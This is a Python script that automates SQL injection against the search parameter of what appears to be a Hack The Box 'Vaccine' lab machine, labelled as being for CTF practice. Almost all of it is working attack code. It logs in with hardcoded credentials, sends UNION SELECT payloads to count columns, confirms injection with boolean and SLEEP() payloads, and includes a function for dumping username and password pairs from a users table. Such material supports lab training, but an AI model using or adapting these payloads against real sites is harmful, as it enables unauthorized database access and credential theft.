#!/usr/bin/env python3
"""
SQL Injection Automation Script
Target: HTB Vaccine - dashboard.php search parameter
For authorized security testing / CTF practice only.
"""

import requests
import sys
import time

BASE_URL = "http://10.129.95.174"
LOGIN_URL = f"{BASE_URL}/index.php"
DASHBOARD_URL = f"{BASE_URL}/dashboard.php"

LOGIN_CREDS = {"username": "admin", "password": "qwerty789"}

session = requests.Session()


def login():
    """Authenticate and keep the session cookie for later requests."""
    resp = session.post(LOGIN_URL, data=LOGIN_CREDS, allow_redirects=True)
    if "logout" in resp.text.lower() or resp.status_code == 200:
        print("[+] Login request sent.")
    else:
        print("[-] Login may have failed, check credentials.")
    return resp


def send_payload(payload):
    """Send a search payload and return the response object."""
    params = {"search": payload}
    return session.get(DASHBOARD_URL, params=params)


def find_column_count(max_cols=15):
    """
    Try UNION SELECT with increasing column counts.
    Detects success via response length changes (works even with no visible SQL errors).
    """
    print("[*] Detecting baseline response...")
    baseline = send_payload("zzzznonexistent")
    baseline_len = len(baseline.text)
    print(f"[*] Baseline length: {baseline_len}")

    for cols in range(1, max_cols + 1):
        payload = f"' UNION SELECT {','.join(str(i) for i in range(1, cols + 1))}-- -"
        resp = send_payload(payload)
        diff = len(resp.text) - baseline_len
        status = "CHANGED" if diff != 0 else "same"
        print(f"[{cols:2d} cols] len={len(resp.text)} diff={diff:+d} ({status}) payload={payload}")

        # Heuristic: a real error message or 500 status strongly suggests wrong column count
        if resp.status_code >= 500 or "sql syntax" in resp.text.lower():
            print(f"    -> SQL error detected at {cols} columns (too many or too few).")

    print("\n[*] Review the table above manually: look for the point where output")
    print("    length/content changes meaningfully (new content appears) vs baseline.")


def boolean_blind_test():
    """Confirm injection via TRUE/FALSE boolean logic when no visible output changes."""
    true_payload = "' AND 1=1-- -"
    false_payload = "' AND 1=2-- -"

    r_true = send_payload(true_payload)
    r_false = send_payload(false_payload)

    print(f"[TRUE ] len={len(r_true.text)} status={r_true.status_code}")
    print(f"[FALSE] len={len(r_false.text)} status={r_false.status_code}")

    if len(r_true.text) != len(r_false.text):
        print("[+] Boolean-based SQL injection CONFIRMED (responses differ).")
        return True
    else:
        print("[-] No difference detected — try time-based test next.")
        return False


def time_based_test(delay=5):
    """Confirm injection via response delay when boolean test shows nothing."""
    payload = f"' AND SLEEP({delay})-- -"
    start = time.time()
    send_payload(payload)
    elapsed = time.time() - start

    print(f"[*] Response took {elapsed:.2f}s (expected ~{delay}s if vulnerable)")
    if elapsed >= delay:
        print("[+] Time-based SQL injection CONFIRMED.")
        return True
    print("[-] No delay detected.")
    return False


def dump_column(col_count, target_col, table, column, condition="1=1"):
    """
    Extract data from a specific table/column using UNION SELECT.
    col_count: number of columns found in step 1.
    target_col: which position (1-indexed) reflects on the page.
    """
    cols = ["NULL"] * col_count
    cols[target_col - 1] = column
    select_clause = ",".join(cols)

    payload = f"' UNION SELECT {select_clause} FROM {table} WHERE {condition}-- -"
    resp = send_payload(payload)
    print(f"[*] Payload: {payload}")
    return resp.text


if __name__ == "__main__":
    login()
    print("\n=== Step 1: Column Count Detection ===")
    find_column_count(max_cols=10)

    print("\n=== Step 2: Boolean-Blind Confirmation ===")
    if not boolean_blind_test():
        print("\n=== Step 3: Time-Based Confirmation ===")
        time_based_test()

    print("\n=== Step 4 (manual): Dump Data ===")
    print("Once column count and reflecting position are known, call:")
    print('  dump_column(col_count=4, target_col=2, table="users", column="CONCAT(username,0x3a,password)")')
